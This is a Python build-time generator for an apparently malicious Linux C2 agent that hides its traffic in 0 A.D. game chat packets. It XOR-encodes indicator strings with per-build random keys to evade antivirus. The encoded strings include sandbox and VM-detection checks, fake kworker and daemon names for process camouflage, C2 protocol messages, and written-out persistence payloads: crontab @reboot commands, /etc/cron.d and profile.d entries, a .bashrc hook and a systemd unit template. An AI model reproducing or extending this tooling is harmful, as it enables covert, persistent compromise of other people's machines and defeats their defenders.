#!/usr/bin/env python3
"""
gen_agent_iocs.py — Build-time generator for obf_agent_iocs.h
==============================================================

PURPOSE
-------
This script is run once at compile time (by the Makefile) to produce
a C header file called ``obf_agent_iocs.h``.  That header is then
#included by the agent's C source code.

WHAT IS AN IOC?
---------------
IOC stands for "Indicator of Compromise".  When a security analyst
or antivirus scans a binary file, they look for recognisable strings
and byte patterns — these are IOCs.  Examples:
  - The literal string "/proc/self/exe" in a binary immediately
    signals that the program is inspecting itself (suspicious).
  - The string "VirtualBox" suggests the program is checking whether
    it runs inside a virtual machine (also suspicious).

WHY OBFUSCATE?
--------------
If we store those strings as plain text inside the compiled binary,
any AV or EDR can flag the binary immediately just by scanning for
known strings.  To defeat that, we XOR-encode every string before
embedding it.  The plaintext never appears in the compiled binary;
instead only scrambled bytes exist.  At runtime the C code XOR-decodes
the bytes back into the original string, uses it, and discards it.

HOW THE XOR KEY WORKS
---------------------
A simple XOR with a fixed key would still be easy to detect: an
analyst would notice all the strings look XOR-encoded and could
brute-force the single-byte key in 255 tries.

To make it harder we:
  1. Pick a RANDOM key on every build (so every build looks different).
  2. Split the key into two 4-bit halves (nibbles) stored in SEPARATE
     volatile variables (_k_xx_hi and _k_xx_lo).  The compiler cannot
     merge them back into a constant because ``volatile`` tells it the
     variables may change at any moment.  This prevents the compiler
     from optimising away the XOR at compile time (constant folding).
  3. The C macro SB_KEY = (hi << 4) | lo reconstructs the full byte
     at runtime only, making static analysis harder.

TWO SEPARATE KEY DOMAINS
-------------------------
We use two independent random keys:
  - SB_KEY : for "sandbox detection" strings and all other agent
             strings (file paths, protocol messages, etc.)
  - PN_KEY : for "process name" strings — the fake kernel thread
             names the agent uses to camouflage itself, and the
             player names used as the NMT_CHAT sender field in the
             0 A.D. game protocol.

WHY PLAYER NAMES?
-----------------
This C2 framework hides traffic inside 0 A.D. (a real-time strategy
game) network packets.  The NMT_CHAT packet type contains a "sender"
field that appears as a player name.  By sending C2 commands as chat
messages from a convincing player name, the traffic blends in with
legitimate game traffic.  The names are randomised per build so every
deployment of the agent looks different on the wire.

WHAT DOES THE GENERATED HEADER LOOK LIKE?
------------------------------------------
For each string we output a C array like:
    static const uint8_t _sb_uptime[] = {0xAB, 0xCD, ...};
The bytes 0xAB, 0xCD, etc. are the original characters XOR'd with the
key.  At runtime the agent calls a decode function to recover the
original string.
"""

import argparse
import secrets
import string
import sys


# ── Helper: XOR-encode a string ───────────────────────────────────────────────

def enc_hex(s, key):
    """
    XOR-encode a string (or bytes) with the given single-byte key.

    Each byte of the input string is XOR'd with ``key`` and formatted as
    a two-digit hex literal (e.g. "0x3F").  The results are joined with
    commas, ready to be placed inside a C array initialiser.

    Example:
        enc_hex("AB", 0xAA)
        -> "0xEB,0xE8"   (0x41^0xAA=0xEB, 0x42^0xAA=0xE8)
    """
    bs = s.encode("utf-8") if isinstance(s, str) else s
    return ",".join(f"0x{b ^ key:02X}" for b in bs)


# ── Helper: emit one C array line ─────────────────────────────────────────────

def arr_line(name, s, key):
    """
    Produce a complete C static array declaration for one encoded string.

    The result looks like:
        static const uint8_t _sb_uptime[]={0xXX,0xYY,...};
    Note: there is deliberately no null terminator — the C code uses the
    explicit byte length, not strlen(), so we do not need one.
    """
    return f"static const uint8_t {name}[]=" + "{" + enc_hex(s, key) + "};"


# ── Helper: emit a C struct array (lookup table) ───────────────────────────────

def table_line(type_decl, table_name, entries):
    """
    Produce a C array of structs that acts as a lookup table.

    Parameters
    ----------
    type_decl   : C struct field declarations as a string, e.g.
                  "const uint8_t *d; uint8_t n"
    table_name  : the name of the resulting C array variable
    entries     : list of (c_array_name, byte_length) tuples

    The emitted C code is an anonymous struct array where each element
    holds a pointer to one encoded byte array and the length of that
    array.  At runtime the agent iterates this table to compare strings
    without ever having the plaintext in a searchable form.
    """
    inner = ",".join("{" + f"{n},{l}" + "}" for n, l in entries)
    return "static const struct {" + type_decl + ";} " + table_name + "[]={" + inner + "};"


# ── Player name pool ───────────────────────────────────────────────────────────
# 194 historical and gamer-style bases drawn from antiquity through the medieval
# period.  gen_agent_iocs selects 20 at random and mutates each one, so every
# build has a unique set of player names on the wire.
PLAYER_POOL = [
    # Antiquity / strategy — lowercase, 0AD pseudo style
    "caesar", "brutus", "scipio", "hannibal", "leonidas", "pompey", "cicero", "marcus",
    "julius", "crassus", "sulla", "marius", "trajan", "hadrian", "nerva", "domitian",
    "vespasian", "tiberius", "caligula", "claudius", "nero", "galba", "otho", "vitellius",
    "pertinax", "didius", "severus", "caracalla", "macrinus", "diadumenian", "heliogabalus",
    "alexander", "maximinus", "gordian", "balbinus", "pupienus", "decius", "gallus",
    "valerian", "gallienus", "claudius2", "aurelian", "tacitus", "florian", "probus",
    "carus", "carinus", "numerian", "diocletian", "maximian", "constantius", "galerius",
    "constantine", "crispus", "fausta", "licinius", "constans", "julian", "jovian",
    "valentinian", "valens", "gratian", "maximus", "eugenius", "theodosius", "arcadius",
    "honorius", "stilicho", "alaric", "ataulf", "wallia", "theodoric", "attila", "aetius",
    "boniface", "majorian", "ricimer", "glycerius", "romulus", "odoacer", "clovis",
    "belisarius", "narses", "justinian", "theodoric2", "alboin", "chilperic", "guntram",
    "sigebert", "brunhilda", "fredegund", "clotaire", "dagobert", "pepin", "carloman",
    "charlemagne", "lothair", "rollo", "harold", "canute", "richard", "saladin", "baibars",
    "timur", "genghis", "kublai", "ogedei", "batu", "hulegu", "berke", "nogai",
    # Greek / Hellenistic
    "pericles", "themistocles", "aristides", "miltiades", "alcibiades", "lysander",
    "agesilaus", "epaminondas", "pelopidas", "demosthenes", "aeschines", "isocrates",
    "alexander2", "antigonus", "seleucus", "ptolemy", "lysimachus", "pyrrhus", "demetrius",
    "cassander", "eumenes", "craterus", "perdiccas", "antipater", "pausanias", "cleomenes",
    # Carthage / Phoenicia / Persia
    "hamilcar", "hasdrubal", "mago", "bomilcar", "gisco", "himilco", "maharbal",
    "darius", "xerxes", "artaxerxes", "cyrus", "cambyses", "bardiya", "pissuthnes",
    "tissaphernes", "pharnabazus", "artabazus", "memnon", "barsine", "ochus", "bessus",
    # Republican Rome / early empire
    "fabius", "quintus", "publius", "lucius", "gaius", "titus", "gnaeus", "sextus",
    "spurius", "mamercus", "agrippa", "maecenas", "drusus", "germanicus", "caecina",
    # Gamer pseudo styles
    "nomad", "xorion", "ramses", "archon", "trojan", "spartan", "attila99", "legatus",
    "centurion", "decanus", "triarius", "hastatus", "velites", "equites",
    "auxilia", "sagittarius", "ballistarius", "scorpion", "onager", "catapulta",
]


def mutate_name(base, rng):
    """
    Take a base name (e.g. "caesar") and return a mutated version.

    Mutation makes each build's player names unique even if the same base
    is selected twice across two different builds.  The mutator randomly:
      - appends or prepends a short run of lowercase letters, OR
      - appends or prepends digits, OR
      - does both (in a random order around the base)

    This means "caesar" might become "3caesar", "caesarxk", "2xcaesar7",
    etc. — all plausible gamer tags that do not repeat across builds.
    """
    mode = rng.choice(["letters", "digits", "both"])
    lc = string.ascii_lowercase   # 'abcdefghijklmnopqrstuvwxyz'
    dg = string.digits            # '0123456789'

    if mode == "letters":
        part = "".join(rng.choices(lc, k=rng.randint(1, 4)))
        addon_a, addon_b = part, None
    elif mode == "digits":
        part = "".join(rng.choices(dg, k=rng.randint(1, 4)))
        addon_a, addon_b = part, None
    else:
        letters = "".join(rng.choices(lc, k=rng.randint(1, 3)))
        digits  = "".join(rng.choices(dg, k=rng.randint(1, 3)))
        if rng.randint(0, 1):
            addon_a, addon_b = letters, digits
        else:
            addon_a, addon_b = digits, letters

    if addon_b is None:
        return (base + addon_a) if rng.randint(0, 1) else (addon_a + base)
    else:
        place = rng.randint(0, 3)
        if place == 0:   return addon_a + base + addon_b
        elif place == 1: return addon_b + base + addon_a
        elif place == 2: return addon_a + addon_b + base
        else:            return base + addon_a + addon_b


def main():
    parser = argparse.ArgumentParser(
        description="Build-time IOC and string-table generator for the agent.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Generates obf_agent_iocs.h containing XOR-encoded versions of all\n"
            "sandbox-detection strings, VM-vendor names, process-name camouflage\n"
            "strings, C2 protocol tokens, persistence file paths, and 20 random\n"
            "player names for NMT_CHAT sender fields.  Every invocation produces\n"
            "different keys and different player names — no two builds share IOCs.\n"
            "Called by the Makefile; can also be run standalone."
        ),
    )
    parser.add_argument(
        "output", metavar="output.h",
        help="output C header path (e.g. src/obf_agent_iocs.h)",
    )
    a = parser.parse_args()
    out_path = a.output

    # ── Generate random XOR keys ───────────────────────────────────────────────
    # secrets.randbelow(0x80) returns a cryptographically-random integer in [0, 128).
    # Adding 0x80 shifts the range to [0x80, 0xFF] (128-255).  We avoid values below
    # 0x80 because some of those collide with printable ASCII, which would make parts
    # of the encoded data look like readable text to a casual scan.
    SB_KEY = secrets.randbelow(0x80) + 0x80   # sandbox-detection strings key: 0x80-0xFF
    PN_KEY = secrets.randbelow(0x80) + 0x80   # process-name / player-name strings key

    # ── Split each key into two nibbles ───────────────────────────────────────
    # A nibble is half a byte (4 bits).  We split the 8-bit key into:
    #   - HI: the upper 4 bits (bits 7-4), obtained by right-shifting 4 positions
    #   - LO: the lower 4 bits (bits 3-0), obtained by ANDing with 0xF
    # Each nibble is stored in its own C volatile variable.  The C code then
    # reconstructs: key = (hi << 4) | lo — but only at runtime.
    # This means the full key never appears as a literal constant in the binary.
    SB_HI  = (SB_KEY >> 4) & 0xF
    SB_LO  = SB_KEY & 0xF
    PN_HI  = (PN_KEY >> 4) & 0xF
    PN_LO  = PN_KEY & 0xF

    # ── Start building the output lines ───────────────────────────────────────
    out = []
    out.append("/* AUTO-GENERATED by gen_agent_iocs.py — do not edit */")
    out.append("")

    # ── Sandbox-detection key (SB_KEY) — stored as split nibbles ──────────────
    # The ``volatile`` keyword is crucial: it prevents the C compiler from treating
    # these variables as compile-time constants (even at optimisation level -O2).
    # Without ``volatile`` the compiler could compute (hi<<4)|lo at compile time
    # and embed the result directly, making it visible in the binary.
    out.append(f"static volatile uint8_t _k_sb_hi = 0x{SB_HI:01X}u;")
    out.append(f"static volatile uint8_t _k_sb_lo = 0x{SB_LO:01X}u;")
    # This macro reconstructs the full key byte at runtime by combining the nibbles.
    out.append("#define SB_KEY ((uint8_t)((_k_sb_hi << 4) | _k_sb_lo))")
    out.append("")

    # ── Sandbox-detection strings ─────────────────────────────────────────────
    # These are file paths and keywords that the agent reads at startup to decide
    # whether it is running inside a security analysis environment (sandbox):
    #   - /proc/uptime      : low uptime (<3 min) suggests a freshly-booted sandbox
    #   - /proc/self/status : contains TracerPid, which is non-zero if the process
    #                         is being debugged by gdb, strace, etc.
    #   - /sys/class/dmi/id/product_name : hardware vendor name; "VirtualBox",
    #                         "VMware", "QEMU" etc. appear here in virtual machines
    #   - /proc/cpuinfo     : CPU count; sandboxes often have only 1 CPU
    #   - /proc/meminfo     : RAM amount; sandboxes often have very little RAM
    #   - memfd / (deleted) : signs that the agent itself was loaded from memory
    #                         (memfd_create) and has no on-disk path
    sb = [
        ("_sb_uptime",       "/proc/uptime"),
        ("_sb_status",       "/proc/self/status"),
        ("_sb_tracerpid",    "TracerPid:"),
        ("_sb_dmi",          "/sys/class/dmi/id/product_name"),
        ("_sb_cpuinfo",      "/proc/cpuinfo"),
        ("_sb_processor",    "processor"),
        ("_sb_meminfo",      "/proc/meminfo"),
        ("_sb_memtotal",     "MemTotal: "),
        ("_sb_proc",         "/proc"),
        ("_sb_self_exe",     "/proc/self/exe"),
        ("_sb_memfd",        "memfd"),
        ("_sb_deleted",      "(deleted)"),
        ("_sb_memfd_colon",  "/memfd:"),
    ]

    for name, s in sb:
        out.append(arr_line(name, s, SB_KEY))

    out.append("")

    # ── Virtual-machine vendor strings ────────────────────────────────────────
    # The agent reads the DMI product name (from /sys/class/dmi/id/product_name)
    # and the CPU model string (from /proc/cpuinfo) and compares them against
    # these known VM vendor names.  If a match is found the agent assumes it is
    # inside a sandbox and exits cleanly, leaving no trace.
    vm = [
        ("_sb_vbox",    "VirtualBox"),
        ("_sb_vmware",  "VMware"),
        ("_sb_qemu",    "QEMU"),
        ("_sb_bochs",   "Bochs"),
        ("_sb_xen",     "Xen"),
        ("_sb_kvm",     "KVM"),
        ("_sb_msft",    "Microsoft Corporation"),
        ("_sb_inno",    "innotek"),
        ("_sb_oracle",  "Oracle"),
    ]

    for name, s in vm:
        out.append(arr_line(name, s, SB_KEY))

    # Emit the VM lookup table: an array of structs, each holding a pointer to an
    # encoded VM-vendor byte array and that array's length.  The agent iterates
    # this table at startup and XOR-decodes each entry just long enough to compare
    # it against the live DMI string, then discards the decoded bytes.
    out.append(table_line("const uint8_t *d; uint8_t n", "VM_ENC",
                           [(name, len(s.encode("utf-8"))) for name, s in vm]))
    out.append("")

    # ── Process-name key (PN_KEY) ─────────────────────────────────────────────
    # A completely independent key for process-name and player-name strings.
    # Using a separate key means that even if an analyst recovers SB_KEY by
    # analysing the sandbox-detection logic, they still cannot decode the
    # process names or player names without finding PN_KEY separately.
    out.append(f"static volatile uint8_t _k_pn_hi = 0x{PN_HI:01X}u;")
    out.append(f"static volatile uint8_t _k_pn_lo = 0x{PN_LO:01X}u;")
    out.append("#define PN_KEY ((uint8_t)((_k_pn_hi << 4) | _k_pn_lo))")
    out.append("")

    # ── Fake kernel-thread names (kworker pool) ───────────────────────────────
    # On Linux, the process name is visible in tools like ``ps``, ``top``, and
    # ``/proc/<pid>/comm``.  The agent changes its own process name (using the
    # prctl() syscall) to look like a legitimate kernel worker thread.
    # These are real names that appear on a normal Linux system, so the agent's
    # process blends in with the hundreds of legitimate kworker threads.
    kworkers = [
        ("_kw0", "kworker/0:1H"),
        ("_kw1", "kworker/1:2"),
        ("_kw2", "kworker/u4:3"),
        ("_kw3", "kworker/0:0H"),
        ("_kw4", "migration/0"),
        ("_kw5", "kcompactd0"),
        ("_kw6", "kswapd0"),
        ("_kw7", "kthreadd"),
    ]

    # ── Fake system daemon names ──────────────────────────────────────────────
    # Alternatively the agent may disguise itself as one of these common system
    # daemons (background services) that are present on virtually every Linux
    # system.  They are far less suspicious than an unknown process name.
    daemons = [
        ("_dm0", "systemd-journald"),
        ("_dm1", "dbus-daemon"),
        ("_dm2", "NetworkManager"),
        ("_dm3", "polkitd"),
        ("_dm4", "rtkit-daemon"),
        ("_dm5", "accounts-daemon"),
        ("_dm6", "udisksd"),
        ("_dm7", "bluetoothd"),
    ]

    for name, s in kworkers:
        out.append(arr_line(name, s, PN_KEY))

    out.append(table_line("const uint8_t *d; uint8_t n", "KWORKER_ENC",
                           [(name, len(s.encode("utf-8"))) for name, s in kworkers]))
    out.append("")

    for name, s in daemons:
        out.append(arr_line(name, s, PN_KEY))

    out.append(table_line("const uint8_t *d; uint8_t n", "DAEMON_ENC",
                           [(name, len(s.encode("utf-8"))) for name, s in daemons]))
    out.append("")

    # ── C2 protocol strings ────────────────────────────────────────────────────
    # These are the messages that flow between the agent (on the victim machine)
    # and the C2 server (the attacker's machine).  They are embedded in 0 A.D.
    # NMT_CHAT game packets so the traffic looks like in-game chat.
    # Because they would be obvious IOCs ("DH_OK", "ERR: fork", etc.) they are
    # all encoded with SB_KEY.
    proto_strings = [
        ("_sb_dhok",         "DH_OK"),
        ("_sb_errtoomany",   "ERR: too many jobs (max 8)"),
        ("_sb_m_syscron",    "syscron"),
        ("_sb_m_profile",    "profile"),
        ("_sb_syscronok",    "syscron OK\xe2\x86\x92%s"),
        ("_sb_syscronerr",   "syscron ERR"),
        ("_sb_profileok",    "profile OK\xe2\x86\x92%s"),
        ("_sb_profileerr",   "profile ERR"),
        ("_sb_errpipe",      "ERR: pipe"),
        ("_sb_errfork",      "ERR: fork"),
        ("_sb_erropen",      "ERR:open '%s'"),
        ("_sb_errempty",     "ERR:file empty or >4MB"),
        ("_sb_errread",      "ERR:read failed"),
        ("_sb_errlink",      "ERR:readlink"),
        ("_sb_errcopy",      "ERR:copy"),
        ("_sb_errmkdir",     "ERR:mkdir"),
        ("_sb_errunknown",   "ERR:unknown '%s'"),
        ("_sb_ulerr",        "UL ERR: '%s'"),
        ("_sb_ulok",         "UL OK: %s"),
        ("_sb_m_cron",       "cron"),
        ("_sb_m_bashrc",     "bashrc"),
        ("_sb_m_systemd",    "systemd"),
        ("_sb_cronok",       "cron OK\xe2\x86\x92%s"),
        ("_sb_cronerr",      "cron ERR\xe2\x86\x92%s"),
        ("_sb_bashrcok",     "bashrc OK\xe2\x86\x92%s"),
        ("_sb_bashrcfail",   "bashrc FAILED"),
        ("_sb_sysdok",       "systemd OK\xe2\x86\x92%s"),
        ("_sb_sysdfail",     "systemd FAILED"),
        ("_sb_cron_cmd",     "(crontab -l 2>/dev/null|grep -v '%s';"
                             "echo '@reboot %s %s %d \"%s\" \"%s\" >/dev/null 2>&1')|crontab -"),
        ("_sb_sysinfo_fmt",  "id=%s|h=%s|u=%s|a=%s|r=%s|pid=%d|dh=%d"),
        ("_sb_shell_wrap",   "{ %s; } 2>&1"),
        ("_sb_sleep_cmd",    "sleep:"),
        ("_sb_persist_cmd",  "persist:"),
    ]

    out.append("/* Protocol strings (SB_KEY) */")
    for name, s in proto_strings:
        out.append(arr_line(name, s, SB_KEY))
    out.append("")

    # ── Persistence file paths and service unit content ────────────────────────
    # "Persistence" means making the agent survive a reboot.  These strings are
    # the file paths and shell commands needed to install the three persistence
    # mechanisms.  They are especially sensitive IOCs and must be hidden.
    persist_strings = [
        ("_ps_config_systemd",  "%s/.config/systemd/user"),
        ("_ps_cache_svc",       "cache-svc.service"),
        ("_ps_cache_svc_id",    "cache-svc"),
        ("_ps_bashrc",          "%s/.bashrc"),
        ("_ps_local_share",     "%s/.local/share/.svc-%08x"),
        ("_ps_svc_reload",      "systemctl --user daemon-reload 2>/dev/null"),
        ("_ps_svc_enable",      "systemctl --user enable --now cache-svc 2>/dev/null"),
        ("_ps_syscron_path",    "/etc/cron.d/sysupd"),
        ("_ps_profile_path",    "/etc/profile.d/sysnet.sh"),
        ("_ps_root_dest",       "/usr/local/lib/.cache/svc-%08x"),
        ("_ps_syscron_entry",   "@reboot root %s %s %d \"%s\" \"%s\" >/dev/null 2>&1\n"),
        ("_ps_profile_entry",   "test -x '%s' && '%s' %s %d \"%s\" \"%s\" >/dev/null 2>&1 &\n"),
        ("_ps_install_fmt",     "mkdir -p \"$(dirname '%s')\" && cp '%s' '%s' && chmod 755 '%s' 2>&1"),
        ("_ps_mkdir_ud",        "mkdir -p '%s'"),
        ("_ps_bashrc_health",   '\n# health\n(%s %s %d "%s" "%s" >/dev/null 2>&1 &)\n'),
        ("_ps_unit_template",   "[Unit]\nDescription=Cache Service\nAfter=network.target\n\n"
                                "[Service]\nType=simple\nRestart=always\nRestartSec=30\n"
                                'ExecStart=%s %s %d "%s" "%s"\n\n'
                                "[Install]\nWantedBy=default.target\n"),
    ]

    out.append("/* Persistence strings (SB_KEY) */")
    for name, s in persist_strings:
        out.append(arr_line(name, s, SB_KEY))
    out.append("")

    # ── Polymorphic player names ───────────────────────────────────────────────
    # 0 A.D. NMT_CHAT packets include a "player name" (the sender of the chat
    # message).  The C2 protocol embeds commands and responses inside these chat
    # messages.  To make every deployment look different on a network capture,
    # we pick 20 player names at random from a large pool of historical names
    # and game-style aliases, then mutate each one (add random letters/digits),
    # and XOR-encode them with PN_KEY.
    #
    # The agent picks one of these encoded names at runtime and sets it as:
    #   1. The process name visible in ``ps`` (via prctl PR_SET_NAME)
    #   2. The sender field in outbound NMT_CHAT packets
    # This way "ps aux" shows a plausible-looking player name and the network
    # traffic looks like a real game session.

    # Use Python's cryptographically-seeded SystemRandom so name selection is
    # unpredictable.  (The regular ``random`` module uses a predictable seed.)
    rng = secrets.SystemRandom()
    N_PLAYERS = 20   # number of player names to embed per build

    selected_bases = rng.sample(PLAYER_POOL, N_PLAYERS)
    player_names   = [mutate_name(b, rng) for b in selected_bases]
    # prctl(PR_SET_NAME) is limited to 15 characters, and the NMT_CHAT g_player
    # field is 64 bytes.  Truncate at 31 characters to be safe in both contexts.
    player_names = [n[:31] for n in player_names]

    players = [(f"_pn{i}", player_names[i]) for i in range(N_PLAYERS)]

    out.append(
        "/* Polymorphic player names (PN_KEY) — "
        f"{N_PLAYERS} names drawn at random + mutated */"
    )
    for name, s in players:
        out.append(arr_line(name, s, PN_KEY))

    out.append(table_line("const uint8_t *d; uint8_t n", "PLAYER_ENC",
                           [(name, len(s.encode("utf-8"))) for name, s in players]))
    out.append(f"#define N_PLAYER_ENC {N_PLAYERS}u")
    out.append("")

    # ── Write the output header file ───────────────────────────────────────────
    with open(out_path, "w", encoding="utf-8") as f:
        f.write("\n".join(out) + "\n")

    print(f"[gen_agent_iocs] {out_path}: IOCs regenerated ({N_PLAYERS} player names)")


if __name__ == "__main__":
    main()
